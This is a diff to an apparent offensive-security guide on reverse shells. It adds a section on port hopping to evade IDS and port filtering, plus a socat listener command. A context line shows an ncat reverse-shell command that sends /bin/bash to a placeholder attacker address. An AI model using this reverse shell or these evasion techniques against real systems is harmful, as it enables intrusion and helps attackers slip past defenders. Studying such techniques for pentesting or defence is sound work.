@@ -58,3 +58,20 @@ ncat ATTACKER_IP_ADDRESS 9443 --ssl -e /bin/bash -v
 <br>
 
 ## Alternating Between Destination Ports
+*Port hopping* is the practice of dynamically switching network ports during the communication process, which can be used for both defensive and offensive activities.
+On the offensive side, this technique can ensure the stability of the reverse shell and make it more challenging for security monitoring systems to block malicious traffic.
+By constantly changing ports attackers can bypass basic port-based filtering mechanisms ad intrusion detection systems (IDS) that monitor specific ports for suspicious activity.
+Additionally, port hopping makes it more difficult for defenders to prevent the reverse shell connection.
+For example, if a network port becomes unreachable, a port hop will reestablish the connection.
+<br>
+<br>
+Attackers typically implement port hopping by using a predefined range of ports.<br>
+Refrence the file [port-hopper.sh](./port-hopper.sh) as an example of how port hopping could be implemented.
+
+> ### **NOTE**
+> Since you're performing multiple network connections consecutively (i.e., once to check connectivity and another to establish a reverse shell),
+> some versions of Netcat may note support keeping the listener alive. To overcome this, you can use *socat* to set up a TCP listener on the Kali
+> box. This tool will ensure the listener remains alive:
+> ```
+> socat - tcp-listen:34459,fork
+> ```
